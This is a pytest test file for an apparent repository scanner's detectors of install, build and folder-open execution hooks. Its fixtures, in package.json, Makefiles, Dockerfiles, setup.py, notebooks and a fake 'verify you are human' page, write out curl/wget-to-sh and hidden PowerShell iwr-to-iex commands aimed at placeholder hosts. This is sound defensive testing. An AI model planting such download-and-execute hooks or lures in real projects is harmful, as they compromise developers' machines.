"""INS tests. Payloads are inert: example.invalid hosts, 203.0.113.x IPs; shell pipes built by concatenation."""

from __future__ import annotations

import json

from repoguard import registry, rules
from repoguard import tags as T
from repoguard.detectors import exec_hooks as E
from repoguard.models import Confidence, Severity
from tests.conftest import rule_ids, run_detector

HOST = "https://dl.example.invalid"
PIPE = " | " + "sh"


def scan(ctx):
    out = []
    for cls in E.DETECTORS:
        out += run_detector(cls, ctx)
    return out


def by(findings, rid):
    return [f for f in findings if f.rule_id == rid]


def pkg(scripts: dict) -> str:
    return json.dumps({"name": "demo", "version": "1.0.0", "scripts": scripts})


def test_validate_and_lint():
    registry.validate([c() for c in E.DETECTORS])
    import gc

    pats = [o.pattern for o in gc.get_objects() if isinstance(o, E.Pat)] + list(E.PIPE_SHELL_PATTERNS)
    assert pats
    bad = {p: rules.lint_pattern(p) for p in pats if rules.lint_pattern(p)}
    assert not bad


# INS001 ---------------------------------------------------------------------------------
def test_ins001_postinstall_download_high(make_ctx):
    ctx = make_ctx(pkg({"postinstall": "curl -s " + HOST + "/x" + PIPE}), "package.json")
    f = by(scan(ctx), "INS001")
    assert f and f[0].severity >= Severity.HIGH
    assert T.INSTALL_HOOK in f[0].tags


def test_ins001_husky_is_info(make_ctx):
    ctx = make_ctx(pkg({"postinstall": "husky install", "test": "jest"}), "package.json")
    f = by(scan(ctx), "INS001")
    assert f and all(x.severity == Severity.INFO for x in f)


def test_ins001_plain_node_script_medium(make_ctx):
    ctx = make_ctx(pkg({"install": "node scripts/setup.js"}), "package.json")
    f = by(scan(ctx), "INS001")
    assert f and f[0].severity == Severity.MEDIUM


# INS002 / INS003 ------------------------------------------------------------------------
def test_ins002_setup_py_network_exec(make_ctx):
    src = ("import urllib.request, os\nfrom setuptools import setup\n"
           "data = urllib.request.urlopen('" + HOST + "/p').read()\n"
           "os.system('chmod +x /tmp/p')\nsetup(name='demo')\n")
    f = by(scan(make_ctx(src, "setup.py")), "INS002")
    assert f and max(x.severity for x in f) >= Severity.HIGH


def test_ins002_plain_setup_py_clean(make_ctx):
    src = "from setuptools import setup, find_packages\nsetup(name='demo', packages=find_packages())\n"
    f = by(scan(make_ctx(src, "setup.py")), "INS002")
    assert all(x.severity <= Severity.INFO for x in f)


def test_ins003_custom_backend(make_ctx):
    src = "[build-system]\nrequires = ['mybuild @ " + HOST + "/b.tar.gz']\nbuild-backend = 'mybuild'\nbackend-path = ['.']\n"
    assert "INS003" in rule_ids(scan(make_ctx(src, "pyproject.toml")))


def test_ins003_standard_backend_clean(make_ctx):
    src = "[build-system]\nrequires = ['setuptools>=61']\nbuild-backend = 'setuptools.build_meta'\n"
    assert "INS003" not in rule_ids(scan(make_ctx(src, "pyproject.toml")))


# INS004 / INS005 ------------------------------------------------------------------------
def test_ins004_makefile_pipe_shell(make_ctx):
    src = "all:\n\tcurl -fsSL " + HOST + "/i" + PIPE + "\n"
    assert "INS004" in rule_ids(scan(make_ctx(src, "Makefile")))


def test_ins004_benign_makefile(make_ctx):
    src = "build:\n\tgo build ./...\n\ntest:\n\tgo test ./...\n"
    assert "INS004" not in rule_ids(scan(make_ctx(src, "Makefile")))


def test_ins005_build_rs_network(make_ctx):
    src = 'fn main() {\n    let b = reqwest::blocking::get("' + HOST + '/z").unwrap();\n}\n'
    assert "INS005" in rule_ids(scan(make_ctx(src, "build.rs")))


def test_ins005_benign_build_rs(make_ctx):
    src = 'fn main() {\n    println!("cargo:rerun-if-changed=build.rs");\n}\n'
    assert "INS005" not in rule_ids(scan(make_ctx(src, "build.rs")))


# INS006 / INS007 ------------------------------------------------------------------------
def test_ins006_binding_gyp_command_expansion(make_ctx):
    src = "{'targets': [{'target_name': 'a', 'sources': ['<!(curl -s " + HOST + "/q" + PIPE + ")']}]}"
    assert "INS006" in rule_ids(scan(make_ctx(src, "binding.gyp")))


def test_ins006_node_addon_api_is_benign(make_ctx):
    src = "{'targets': [{'target_name': 'a', 'include_dirs': [\"<!(node -p \\\"require('node-addon-api').include\\\")\"]}]}"
    assert all(f.severity <= Severity.LOW for f in by(scan(make_ctx(src, "binding.gyp")), "INS006"))


def test_ins007_composer_script(make_ctx):
    src = json.dumps({"scripts": {"post-install-cmd": "curl " + HOST + "/c" + PIPE}})
    assert "INS007" in rule_ids(scan(make_ctx(src, "composer.json")))


# INS008 / INS009 / INS010 ---------------------------------------------------------------
def test_ins008_folder_open_task(make_ctx):
    src = json.dumps({"version": "2.0.0", "tasks": [{"label": "x", "type": "shell", "command": "node .vscode/t.js",
                                                     "runOptions": {"runOn": "folderOpen"}}]})
    f = by(scan(make_ctx(src, ".vscode/tasks.json")), "INS008")
    assert f and f[0].severity >= Severity.HIGH and T.OPEN_HOOK in f[0].tags


def test_ins008_normal_task_clean(make_ctx):
    src = json.dumps({"version": "2.0.0", "tasks": [{"label": "build", "type": "npm", "script": "build"}]})
    assert "INS008" not in rule_ids(scan(make_ctx(src, ".vscode/tasks.json")))


def test_ins009_devcontainer_initialize(make_ctx):
    src = json.dumps({"image": "mcr.microsoft.com/devcontainers/base", "initializeCommand": "bash .devcontainer/i.sh"})
    f = by(scan(make_ctx(src, ".devcontainer/devcontainer.json")), "INS009")
    assert f and f[0].severity >= Severity.HIGH


def test_ins010_idea_startup_task(make_ctx):
    src = ('<project version="4"><component name="ProjectStartupConfigurationManager">'
           '<configuration id="x" name="boot" /></component></project>')
    assert "INS010" in rule_ids(scan(make_ctx(src, ".idea/workspace.xml")))


# INS011 / INS012 ------------------------------------------------------------------------
def test_ins011_husky_hook_download(make_ctx):
    src = "#!/bin/sh\ncurl -s " + HOST + "/h" + PIPE + "\n"
    f = by(scan(make_ctx(src, ".husky/pre-commit")), "INS011")
    assert f and f[0].severity >= Severity.MEDIUM


def test_ins011_husky_lint_low(make_ctx):
    src = "#!/bin/sh\nnpx lint-staged\n"
    f = by(scan(make_ctx(src, ".husky/pre-commit")), "INS011")
    assert all(x.severity <= Severity.LOW for x in f)


def test_ins012_dockerfile_pipe_shell(make_ctx):
    src = "FROM alpine:3.20\nRUN wget -qO- " + HOST + "/d" + PIPE + "\n"
    assert "INS012" in rule_ids(scan(make_ctx(src, "Dockerfile")))


def test_ins012_compose_docker_sock(make_ctx):
    src = "services:\n  app:\n    image: demo\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n"
    assert "INS012" in rule_ids(scan(make_ctx(src, "docker-compose.yml")))


def test_ins012_plain_dockerfile_clean(make_ctx):
    src = "FROM python:3.13-slim\nCOPY . /app\nRUN pip install -r /app/requirements.txt\n"
    assert "INS012" not in rule_ids(scan(make_ctx(src, "Dockerfile")))


# INS013 ---------------------------------------------------------------------------------
def test_ins013_readme_pipe_raw_ip_high(make_ctx):
    src = "# Demo\n\nInstall:\n\n```\ncurl -s http://203.0.113.7/i" + PIPE + "\n```\n"
    f = by(scan(make_ctx(src, "README.md")), "INS013")
    assert f and f[0].severity >= Severity.HIGH and T.NO_DAMPEN in f[0].tags


def test_ins013_clickfix(make_ctx):
    src = ("<p>To verify you are human press Win+R, then paste with Ctrl+V and press Enter:</p>\n"
           "<code>powershell -w hidden -c iwr " + HOST + "/v" + " | " + "iex</code>\n")
    assert "INS013" in rule_ids(scan(make_ctx(src, "docs/verify.html")))


def test_ins013_plain_readme_clean(make_ctx):
    src = "# Demo\n\nRun `pip install demo` and then `demo --help`.\n"
    assert "INS013" not in rule_ids(scan(make_ctx(src, "README.md")))


# INS014 / INS015 / INS016 ---------------------------------------------------------------
def test_ins014_rc_write(make_ctx):
    src = "#!/bin/sh\necho 'export PATH=$HOME/.demo/bin:$PATH' >> ~/.bashrc\n"
    assert "INS014" in rule_ids(scan(make_ctx(src, "install.sh")))


def test_ins015_pth_import(make_ctx):
    f = by(scan(make_ctx("import os; os.getcwd()\n", "demo.pth")), "INS015")
    assert f and f[0].severity >= Severity.HIGH and T.NO_DAMPEN in f[0].tags


def test_ins015_pth_plain_path_clean(make_ctx):
    assert "INS015" not in rule_ids(scan(make_ctx("src\n", "demo.pth")))


def test_ins016_notebook_pipe(make_ctx):
    nb = {"cells": [{"cell_type": "code", "source": ["!curl -s " + HOST + "/n" + PIPE + "\n"]}],
          "metadata": {}, "nbformat": 4, "nbformat_minor": 5}
    assert "INS016" in rule_ids(scan(make_ctx(json.dumps(nb, indent=1), "demo.ipynb")))


def test_ins016_notebook_plain_clean(make_ctx):
    nb = {"cells": [{"cell_type": "code", "source": ["!pip install numpy\n", "import numpy as np\n"]}],
          "metadata": {}, "nbformat": 4, "nbformat_minor": 5}
    assert "INS016" not in rule_ids(scan(make_ctx(json.dumps(nb, indent=1), "demo.ipynb")))


def test_test_dir_lowers_confidence(make_ctx):
    src = "all:\n\tcurl -fsSL " + HOST + "/i" + PIPE + "\n"
    ctx = make_ctx(src, "tests/fixtures/Makefile")
    base = by(scan(make_ctx(src, "Makefile")), "INS004")
    f = by(scan(ctx), "INS004")
    assert f and base and f[0].confidence < base[0].confidence
